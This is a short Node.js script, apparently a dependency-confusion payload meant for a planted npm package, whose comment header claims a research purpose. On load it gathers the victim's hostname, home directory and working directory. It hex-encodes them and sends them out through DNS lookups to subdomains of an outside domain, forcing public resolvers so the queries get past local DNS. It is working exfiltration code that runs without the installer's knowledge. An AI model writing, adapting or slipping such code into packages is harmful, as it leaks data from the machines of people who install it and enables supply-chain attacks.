/*

This code is used for research purposes.

No sensitive data is retrieved.

Callbacks from within organizations with a
responsible disclosure program will be reported
directly to the organizations.

Any other callbacks will be ignored, and
any associated data will not be kept.

For any questions or suggestions:

security-research@krivaltsevich.com
https://github.com/70f6bc0a/Contact

LICENSE:

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/

const dns = require('dns');
const os = require('os');

const suffix = '70f6bc0a.com';
const id = Math.random().toString(36).substring(2);

const package = '!!!CHANGE_ME!!!';

function sendToServer(data) {
    data = Buffer.from(data).toString('hex');
    data = data.match(/.{1,60}/g);
    
    data.forEach(function (chunk, idx){
        try {
            dns.resolve(`${id}.${idx}.${chunk}.${package}.${suffix}`, 'A', console.log);
        } catch (e) { }
    });
}

function tryGet(toCall) {
    try {
        return toCall();
    } catch(e) {
        return 'err';
    }
}

data = {
    i : id,
    p : package,
    h : tryGet(os.hostname),
    d : tryGet(os.homedir),
    c : __dirname
}

data = JSON.stringify(data);

dns.setServers([
  '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
  '94.140.14.14', '94.140.15.15', '94.140.14.15', '94.140.15.16',
  '94.140.14.140', '94.140.14.141', '185.228.168.168', '185.228.169.168',
  '185.228.168.10', '185.228.169.11', '185.228.168.9', '185.228.169.9',
  '1.1.1.2', '1.0.0.2', '1.1.1.3', '1.0.0.3',
  '208.67.222.222', '208.67.220.220', '208.67.222.123', '208.67.220.123',
  '208.67.222.2', '208.67.220.2', '185.121.177.177', '169.239.202.202',
  '77.88.8.1', '77.88.8.8', '77.88.8.2', '77.88.8.88',
  '77.88.8.3', '77.88.8.7'
]);
sendToServer(data);
